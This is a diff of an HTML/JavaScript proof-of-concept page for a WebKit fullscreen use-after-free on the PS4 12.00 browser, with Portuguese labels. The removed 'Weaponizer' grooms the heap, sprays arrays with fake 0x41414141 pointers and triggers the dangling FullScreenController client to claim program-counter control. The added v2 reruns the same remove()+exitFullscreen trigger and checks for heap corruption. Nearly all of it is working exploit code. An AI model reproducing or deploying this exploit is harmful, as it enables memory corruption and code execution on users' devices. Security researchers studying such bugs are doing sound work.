@@ -2,104 +2,121 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - Weaponization Lab</title>
-<style>
-    body { background-color: #111; color: #fff; font-family: sans-serif; text-align: center; padding-top: 30px; }
-    button { padding: 15px; font-size: 16px; font-weight: bold; margin: 10px; cursor: pointer; border-radius: 5px; border: none;}
-    .btn-hijack1 { background-color: #cc0000; color: white; }
-    .btn-hijack2 { background-color: #aa00aa; color: white; }
-    .btn-timer { background-color: #0077cc; color: white; }
-    #log { margin-top: 20px; font-size: 16px; color: #0f0; font-family: monospace; }
-</style>
+<title>PS4 Fullscreen UAF - v2</title>
 </head>
 <body>
+  <h2>PS4 12.00 - Fullscreen UAF Test (v2)</h2>
+  <button onclick="runTest()">Iniciar Teste</button>
+  <div id="log"></div>
 
-<h2>WebKit UAF Weaponizer (PS4 12.00)</h2>
-<p>Selecione a carga de memória para provar o controle de execução (RCE).</p>
+  <script>
+const PATTERN = 2.121995791e-314;
+const BLUR_DELAY_MS = 80;
+const CORRUPTION_CHECK_DELAY_MS = 150;
 
-<button class="btn-hijack1" onclick="runTest(1)">1. Injetar PC (0x41414141)</button>
-<button class="btn-hijack2" onclick="runTest(2)">2. Injetar PC (0x42424242)</button>
-<button class="btn-timer" onclick="runTest(3)">3. Sincronizar Animação (500ms)</button>
+let controllers = [];
 
-<div id="log">Aguardando comando...</div>
+function log(msg) {
+    try { console.log(msg); } catch(e) {}
+    document.getElementById("log").innerHTML += "<p>" + msg + "</p>";
+}
 
-<script>
-function runTest(mode) {
-    const log = document.getElementById("log");
-    log.innerHTML = "Preparando a memória...<br><b>Pressione OPTIONS agora!</b>";
-
-    let controllers = [];
-
-    // [1] Heap Grooming: Alocação inicial perfeita
-    for(let i = 0; i < 5000; i++) {
+function setupHeap() {
+    controllers = [];
+    for (let i = 0; i < 5000; i++) {
         let arr = new Float64Array(8);
         arr[0] = i;
+        arr[1] = PATTERN;
         controllers.push(arr);
     }
+    log("[*] Heap: 5000 Float64Arrays alocados (PATTERN em [1])");
+}
 
-    // [2] Criação do Alvo (O nosso m_client no C++)
+function checkCorruption() {
+    let corrupted = 0;
+    for (let i = 0; i < controllers.length; i++) {
+        const expectedIndex = i;
+        const expectedPattern = PATTERN;
+        if (controllers[i][0] !== expectedIndex || controllers[i][1] !== expectedPattern) {
+            log("[!!!] CORRUPTION at controllers[" + i + "]"
+                + " → [0]=" + controllers[i][0]
+                + " expected=" + expectedIndex
+                + " | [1]=" + controllers[i][1]
+                + " expected=" + expectedPattern);
+            corrupted++;
+            if (corrupted >= 10) {
+                log("[!!!] Limite de relato atingido, abortando scan.");
+                break;
+            }
+        }
+    }
+    if (corrupted === 0) {
+        log("[OK] Nenhuma corrupção detectada nos arrays.");
+    } else {
+        log("[!!!] Total corrompidos: " + corrupted);
+    }
+}
+
+function setupFullscreen() {
     let fsTarget = document.createElement("div");
-    fsTarget.style.cssText = "position:absolute; top:0; left:0; width:100%; height:100%; background:black;";
-    fsTarget.innerHTML = "<h2 style='color:white; margin-top: 20%;'>Armadilha Ativa.<br>Aperte OPTIONS.</h2>";
+    fsTarget.innerHTML = "<h1>FULLSCREEN ACTIVE — Pressione OPTIONS</h1>";
     document.body.appendChild(fsTarget);
 
     if (fsTarget.webkitRequestFullscreen) {
         fsTarget.webkitRequestFullscreen();
+    } else {
+        document.documentElement.webkitRequestFullscreen?.();
     }
 
+    return fsTarget;
+}
+
+function trigger(fsTarget) {
+    log("[*] Trigger: remove() + exitFullscreen()");
+
+    const refBeforeRemove = document.webkitFullscreenElement;
+    log("[*] webkitFullscreenElement antes do remove: " + (refBeforeRemove ? "presente" : "null"));
+
+    try {
+        fsTarget.remove();
+    } catch(e) {
+        log("[ERRO] remove(): " + e);
+    }
+
+    const refAfterRemove = document.webkitFullscreenElement;
+    log("[*] webkitFullscreenElement após remove(): " + (refAfterRemove ? "AINDA PRESENTE (dangling?)" : "null"));
+
+    try {
+        if (document.webkitIsFullScreen || document.fullscreenElement || refAfterRemove) {
+            document.webkitExitFullscreen?.() || document.webkitCancelFullScreen?.();
+            log("[*] exitFullscreen() chamado");
+        } else {
+            log("[*] exitFullscreen() pulado (não estava em fullscreen)");
+        }
+    } catch(e) {
+        log("[ERRO] exitFullscreen(): " + e);
+    }
+
+    setTimeout(() => {
+        log("[*] Verificando corrupção de heap...");
+        checkCorruption();
+    }, CORRUPTION_CHECK_DELAY_MS);
+}
+
+function runTest() {
+    document.getElementById("log").innerHTML = "";
+    log("[*] Iniciando teste...");
+
+    setupHeap();
+    let fsTarget = setupFullscreen();
+
     window.onblur = function() {
-        log.innerHTML += "<br>[*] Onblur detectado. Iniciando Exploração...";
-
-        // [3] Força GC (Libera a memória)
-        controllers = null;
-        for (let i = 0; i < 20000; i++) {
-            new ArrayBuffer(0x10000);
-        }
-
-        // [4] SPRAY ESTRUTURADO (Uint32Array para controle hexadecimal exato)
-        let spray = [];
-        let hexValue = 0x41414141; // Padrão
-        
-        if (mode === 2) hexValue = 0x42424242; // Mudança de payload
-        if (mode === 3) hexValue = 0x43434343; // C de Constante de Animação
-        
-        for(let i = 0; i < 15000; i++) {
-            let p = new Uint32Array(16); // 64 bytes (tamanho exato de um objeto Render/Node básico)
-            for(let j = 0; j < 16; j+=2) {
-                p[j] = hexValue;     // Low 32-bits
-                p[j+1] = hexValue;   // High 32-bits (Juntos formam o ponteiro 64-bit perfeito)
-            }
-            spray.push(p);
-        }
-
-        // [5] O Gatilho com Timing Baseado na Source do WebKit
-        setTimeout(() => {
-            try {
-                // Removemos o elemento (Criando o Dangling Pointer em FullScreenController::m_client)
-                fsTarget.remove(); 
-                
-                // Forçamos o uso do ponteiro envenenado (Chama fullScreenClientWillExitFullScreen)
-                if (document.webkitIsFullScreen || document.fullscreenElement) {
-                    document.webkitExitFullscreen?.() || document.webkitCancelFullScreen?.();
-                }
-            } catch(e) {
-                console.log(e);
-            }
-
-            // [6] A Mágica do Tempo C++
-            if (mode === 1 || mode === 2) {
-                // No modo de injeção direta, pressionamos o motor rapidamente (fallback original)
-                setTimeout(() => location.reload(), 200); 
-            } else if (mode === 3) {
-                // No modo Sincronizado, batemos EXATAMENTE na constante kFullScreenAnimationDuration
-                // para acertar o callback `exitFullScreenRepaintCompleted()`
-                setTimeout(() => location.reload(), 500); 
-            }
-            
-        }, 3000);
+        log("[*] onblur disparado — aguardando " + BLUR_DELAY_MS + "ms para trigger");
+        window.onblur = null;
+        setTimeout(() => trigger(fsTarget), BLUR_DELAY_MS);
     };
 }
-</script>
-
+  </script>
 </body>
 </html>
+
